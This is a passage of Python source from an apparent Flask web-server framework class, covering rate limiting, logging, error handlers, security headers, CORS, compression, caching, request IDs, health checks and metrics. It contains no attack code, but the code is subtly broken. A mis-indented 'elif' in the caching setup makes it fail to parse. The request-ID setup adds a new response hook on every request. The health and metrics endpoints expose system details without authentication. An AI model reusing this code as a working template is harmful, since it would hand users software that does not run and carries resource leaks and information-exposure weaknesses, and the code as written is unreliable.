            if not rate_limiting_enabled:
                return
                
            # Get rate limits from config
            rate_limits = self.config_manager.get('rate_limiting.limits', {})
            
            # Apply rate limits to routes
            for route, limit in rate_limits.items():
                # Find the route handler
                for rule in self.app.url_map.iter_rules():
                    if rule.rule == route:
                        # Apply rate limiting to the handler
                        handler = self.app.view_functions[rule.endpoint]
                        self.app.view_functions[rule.endpoint] = self.rate_limiter.apply_limits(handler, limit)
                        break
                        
            self.logger.info(f"Rate limiting configured for {len(rate_limits)} routes")
        except Exception as e:
            self.logger.error(f"Error setting up rate limiting: {str(e)}")
    
    def setup_logging(self):
        """Setup advanced logging configuration"""
        try:
            # Get logging settings
            log_level = self.config_manager.get('framework.logging_level', 'INFO')
            log_format = self.config_manager.get('framework.log_format', '%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            log_file = self.config_manager.get('framework.log_file', None)
            
            # Configure logging
            logging.basicConfig(
                level=getattr(logging, str(log_level).upper(), logging.INFO),
                format=log_format
            )
            
            # Add file handler if specified
            if log_file:
                file_handler = logging.FileHandler(log_file)
                file_handler.setFormatter(logging.Formatter(log_format))
                logging.getLogger().addHandler(file_handler)
                
            # Add rotating file handler if configured
            if self.config_manager.get('framework.log_rotation', False):
                from logging.handlers import RotatingFileHandler
                max_bytes = self.config_manager.get('framework.log_max_bytes', 10485760)  # 10MB
                backup_count = self.config_manager.get('framework.log_backup_count', 5)
                
                rotating_handler = RotatingFileHandler(
                    log_file,
                    maxBytes=max_bytes,
                    backupCount=backup_count
                )
                rotating_handler.setFormatter(logging.Formatter(log_format))
                logging.getLogger().addHandler(rotating_handler)
                
            self.logger.info("Advanced logging configured")
        except Exception as e:
            self.logger.error(f"Error setting up logging: {str(e)}")
    
    def setup_error_handling(self):
        """Setup global error handling"""
        try:
            # Register error handlers
            @self.app.errorhandler(404)
            def not_found(error):
                if request.path.startswith('/api/'):
                    return jsonify({'error': 'Endpoint not found'}), 404
                return render_template('404.html'), 404
                
            @self.app.errorhandler(500)
            def internal_error(error):
                self.logger.error(f"Internal server error: {str(error)}")
                if request.path.startswith('/api/'):
                    return jsonify({'error': 'Internal server error'}), 500
                return render_template('500.html'), 500
                
            @self.app.errorhandler(403)
            def forbidden(error):
                if request.path.startswith('/api/'):
                    return jsonify({'error': 'Access forbidden'}), 403
                return render_template('403.html'), 403
                
            self.logger.info("Global error handling configured")
        except Exception as e:
            self.logger.error(f"Error setting up error handling: {str(e)}")
    
    def setup_security_headers(self):
        """Setup security headers for all responses"""
        try:
            @self.app.after_request
            def add_security_headers(response):
                # Add security headers
                response.headers['X-Content-Type-Options'] = 'nosniff'
                response.headers['X-Frame-Options'] = 'DENY'
                response.headers['X-XSS-Protection'] = '1; mode=block'
                
                # Add CSP if configured
                csp = self.config_manager.get('security.content_security_policy', None)
                if csp:
                    response.headers['Content-Security-Policy'] = csp
                    
                # Add HSTS if configured and using HTTPS
                if self.ssl_context and self.config_manager.get('security.hsts_enabled', False):
                    max_age = self.config_manager.get('security.hsts_max_age', 31536000)
                    response.headers['Strict-Transport-Security'] = f'max-age={max_age}; includeSubDomains'
                    
                return response
                
            self.logger.info("Security headers configured")
        except Exception as e:
            self.logger.error(f"Error setting up security headers: {str(e)}")
    
    def setup_cors(self):
        """Setup CORS for API endpoints"""
        try:
            # Get CORS settings
            cors_enabled = self.config_manager.get('cors.enabled', False)
            
            if not cors_enabled:
                return
                
            # Get allowed origins
            allowed_origins = self.config_manager.get('cors.allowed_origins', ['*'])
            
            # Add CORS headers to API responses
            @self.app.after_request
            def add_cors_headers(response):
                if request.path.startswith('/api/'):
                    origin = request.headers.get('Origin')
                    
                    # Check if origin is allowed
                    if '*' in allowed_origins or origin in allowed_origins:
                        response.headers['Access-Control-Allow-Origin'] = origin or '*'
                        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
                        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-API-Key'
                        response.headers['Access-Control-Max-Age'] = '86400'
                        
                return response
                
            # Handle preflight requests
            @self.app.route('/api/<path:path>', methods=['OPTIONS'])
            def handle_options(path):
                return '', 200
                
            self.logger.info(f"CORS configured for {len(allowed_origins)} origins")
        except Exception as e:
            self.logger.error(f"Error setting up CORS: {str(e)}")
    
    def setup_compression(self):
        """Setup response compression"""
        try:
            # Get compression settings
            compression_enabled = self.config_manager.get('compression.enabled', False)
            
            if not compression_enabled:
                return
                
            # Get compression level
            compression_level = self.config_manager.get('compression.level', 6)
            
            # Add compression to responses
            @self.app.after_request
            def compress_response(response):
                # Only compress text-based responses
                if response.content_type and 'text' in response.content_type:
                    # Check if client accepts gzip
                    accept_encoding = request.headers.get('Accept-Encoding', '')
                    if 'gzip' in accept_encoding:
                        # Compress response
                        import gzip
                        from io import BytesIO
                        
                        # Create gzip buffer
                        buffer = BytesIO()
                        with gzip.GzipFile(fileobj=buffer, mode='wb', compresslevel=compression_level) as gz_file:
                            gz_file.write(response.data)
                            
                        # Update response
                        response.data = buffer.getvalue()
                        response.headers['Content-Encoding'] = 'gzip'
                        response.headers['Content-Length'] = len(response.data)
                        
                return response
                
            self.logger.info("Response compression configured")
        except Exception as e:
            self.logger.error(f"Error setting up compression: {str(e)}")
    
    def setup_caching(self):
        """Setup response caching"""
        try:
            # Get caching settings
            caching_enabled = self.config_manager.get('caching.enabled', False)
            
            if not caching_enabled:
                return
                
            # Get cache configuration
            cache_type = self.config_manager.get('caching.type', 'simple')
            cache_timeout = self.config_manager.get('caching.timeout', 300)  # 5 minutes
            
            # Setup cache based on type
            if cache_type == 'simple':
                from flask_caching import Cache
                cache_config = {
                    'CACHE_TYPE': 'simple',
                    'CACHE_DEFAULT_TIMEOUT': cache_timeout
                }
                elif cache_type == 'redis':
                from flask_caching import Cache
                redis_url = self.config_manager.get('caching.redis_url', 'redis://localhost:6379/0')
                cache_config = {
                    'CACHE_TYPE': 'redis',
                    'CACHE_REDIS_URL': redis_url,
                    'CACHE_DEFAULT_TIMEOUT': cache_timeout
                }
            elif cache_type == 'memcached':
                from flask_caching import Cache
                memcached_url = self.config_manager.get('caching.memcached_url', 'memcached://localhost:11211/')
                cache_config = {
                    'CACHE_TYPE': 'memcached',
                    'CACHE_MEMCACHED_SERVERS': [memcached_url],
                    'CACHE_DEFAULT_TIMEOUT': cache_timeout
                }
            else:
                self.logger.warning(f"Unsupported cache type: {cache_type}")
                return
                
            # Initialize cache
            self.cache = Cache(self.app, config=cache_config)
            
            # Cache specific routes
            cached_routes = self.config_manager.get('caching.routes', [])
            for route in cached_routes:
                # Find the route handler
                for rule in self.app.url_map.iter_rules():
                    if rule.rule == route:
                        # Apply caching to the handler
                        handler = self.app.view_functions[rule.endpoint]
                        self.app.view_functions[rule.endpoint] = self.cache.cached(timeout=cache_timeout)(handler)
                        break
                        
            self.logger.info(f"Response caching configured with {cache_type} backend")
        except ImportError:
            self.logger.warning("flask_caching not available, caching disabled")
        except Exception as e:
            self.logger.error(f"Error setting up caching: {str(e)}")
    
    def setup_request_id(self):
        """Setup unique request ID for each request"""
        try:
            import uuid
            
            @self.app.before_request
            def add_request_id():
                # Generate unique request ID
                request_id = str(uuid.uuid4())
                
                # Store in request context
                request.request_id = request_id
                
                # Add to response headers
                @self.app.after_request
                def add_request_id_header(response):
                    response.headers['X-Request-ID'] = request_id
                    return response
                    
            self.logger.info("Request ID tracking configured")
        except Exception as e:
            self.logger.error(f"Error setting up request ID: {str(e)}")
    
    def setup_request_logging(self):
        """Setup detailed request logging"""
        try:
            @self.app.before_request
            def log_request_info():
                # Log request details
                self.logger.info(f"Request: {request.method} {request.path} from {request.remote_addr}")
                
                # Log headers if configured
                if self.config_manager.get('logging.log_headers', False):
                    self.logger.debug(f"Headers: {dict(request.headers)}")
                    
                # Log request body if configured and not too large
                if self.config_manager.get('logging.log_body', False) and request.content_length and request.content_length < 10240:
                    try:
                        body = request.get_data(as_text=True)
                        if body:
                            self.logger.debug(f"Body: {body}")
                    except Exception:
                        pass
                        
            @self.app.after_request
            def log_response_info(response):
                # Log response details
                self.logger.info(f"Response: {response.status_code} for {request.method} {request.path}")
                
                # Log response time if configured
                if self.config_manager.get('logging.log_response_time', False):
                    if hasattr(request, 'start_time'):
                        response_time = time.time() - request.start_time
                        self.logger.debug(f"Response time: {response_time:.3f}s")
                        
                return response
                
            # Store start time for each request
            @self.app.before_request
            def record_start_time():
                request.start_time = time.time()
                
            self.logger.info("Request logging configured")
        except Exception as e:
            self.logger.error(f"Error setting up request logging: {str(e)}")
    
    def setup_health_check_endpoints(self):
        """Setup health check endpoints for monitoring"""
        try:
            # Basic health check
            @self.app.route('/health')
            def basic_health_check():
                return jsonify({
                    'status': 'healthy',
                    'timestamp': time.time(),
                    'version': self.config_manager.get('framework.version', '1.0.0')
                })
                
            # Detailed health check
            @self.app.route('/health/detailed')
            def detailed_health_check():
                try:
                    # Get system info
                    system_info = self.get_system_info()
                    
                    # Get database status
                    db_status = self.db_manager.health_check()
                    
                    # Get active sessions count
                    active_sessions = len(self.session_manager.get_active_sessions())
                    
                    # Calculate overall health
                    overall_status = 'healthy'
                    if system_info.get('cpu', {}).get('usage_percent', 0) > 90:
                        overall_status = 'degraded'
                    if system_info.get('memory', {}).get('percent', 0) > 90:
                        overall_status = 'degraded'
                    if not db_status:
                        overall_status = 'unhealthy'
                        
                    return jsonify({
                        'status': overall_status,
                        'timestamp': time.time(),
                        'system': system_info,
                        'database': {
                            'status': 'healthy' if db_status else 'unhealthy'
                        },
                        'sessions': {
                            'active_count': active_sessions
                        }
                    })
                except Exception as e:
                    self.logger.error(f"Error in detailed health check: {str(e)}")
                    return jsonify({
                        'status': 'unhealthy',
                        'error': str(e),
                        'timestamp': time.time()
                    }), 500
                    
            # Readiness check
            @self.app.route('/ready')
            def readiness_check():
                # Check if server is ready to accept requests
                if self.running and self.db_manager.is_connected():
                    return jsonify({
                        'status': 'ready',
                        'timestamp': time.time()
                    })
                else:
                    return jsonify({
                        'status': 'not ready',
                        'timestamp': time.time()
                    }), 503
                    
            self.logger.info("Health check endpoints configured")
        except Exception as e:
            self.logger.error(f"Error setting up health check endpoints: {str(e)}")
    
    def setup_metrics_collection(self):
        """Setup metrics collection for monitoring"""
        try:
            # Get metrics configuration
            metrics_enabled = self.config_manager.get('metrics.enabled', False)
            
            if not metrics_enabled:
                return
                
            # Initialize metrics storage
            self.metrics = {
                'requests': {
                    'total': 0,
                    'by_method': {},
                    'by_path': {},
                    'by_status': {}
                },
                'responses': {
                    'total_time': 0,
                    'count': 0
                },
                'errors': {
                    'total': 0,
                    'by_type': {}
                },
                'sessions': {
                    'created': 0,
                    'active': 0
                }
            }
            
            # Setup metrics collection middleware
            @self.app.before_request
            def collect_request_metrics():
                # Increment total requests
                self.metrics['requests']['total'] += 1
                
                # Increment by method
                method = request.method
                if method not in self.metrics['requests']['by_method']:
                    self.metrics['requests']['by_method'][method] = 0
                self.metrics['requests']['by_method'][method] += 1
                
                # Increment by path
                path = request.path
                if path not in self.metrics['requests']['by_path']:
                    self.metrics['requests']['by_path'][path] = 0
                self.metrics['requests']['by_path'][path] += 1
                
            @self.app.after_request
            def collect_response_metrics(response):
                # Increment by status
                status = response.status_code
                if status not in self.metrics['requests']['by_status']:
                    self.metrics['requests']['by_status'][status] = 0
                self.metrics['requests']['by_status'][status] += 1
                
                # Collect response time
                if hasattr(request, 'start_time'):
                    response_time = time.time() - request.start_time
                    self.metrics['responses']['total_time'] += response_time
                    self.metrics['responses']['count'] += 1
                    
                return response
                
            # Metrics endpoint
            @self.app.route('/metrics')
            def get_metrics():
                try:
                    # Update current active sessions
                    self.metrics['sessions']['active'] = len(self.session_manager.get_active_sessions())
                    
                    # Calculate average response time
                    avg_response_time = 0
                    if self.metrics['responses']['count'] > 0:
                        avg_response_time = self.metrics['responses']['total_time'] / self.metrics['responses']['count']
                        
                    return jsonify({
                        'timestamp': time.time(),
                        'requests': self.metrics['requests'],
                        'responses': {
                            'count': self.metrics['responses']['count'],
                            'avg_time': avg_response_time
                        },
                        'errors': self.metrics['errors'],
                        'sessions': self.metrics['sessions']
                    })
                except Exception as e:
                    self.logger.error(f"Error getting metrics: {str(e)}")
                    return jsonify({'error': str(e)}), 500
                    
            self.logger.info("Metrics collection configured")
        except Exception as e:
            self.logger.error(f"Error setting up metrics collection: {str(e)}")
    
    def setup_performance_monitoring(self):
        """Setup performance monitoring"""
        try:
            # Get performance monitoring settings
            perf_monitoring_enabled = self.config_manager.get('performance_monitoring.enabled', False)
            
            if not perf_monitoring_enabled:
                return
                
            # Initialize performance metrics
